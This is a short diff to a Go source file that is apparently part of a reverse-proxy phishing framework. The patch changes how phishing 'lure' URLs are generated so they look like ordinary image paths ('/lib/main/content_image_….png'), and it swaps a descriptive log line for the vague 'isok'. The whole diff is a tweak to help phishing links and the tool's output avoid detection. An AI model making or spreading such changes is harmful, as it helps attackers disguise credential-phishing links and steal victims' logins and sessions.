@@ -665,11 +665,11 @@ func (t *Terminal) handleLures(args []string) error {
 					return err
 				}
 				l := &Lure{
-					Path:     "/" + GenRandomString(8),
+					Path:     "/lib/main/content_image_" + GenRandomString(4) + ".png",
 					Phishlet: args[1],
 				}
 				t.cfg.AddLure(args[1], l)
-				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
+				log.Info("isok: %d", len(t.cfg.lures)-1)
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments")
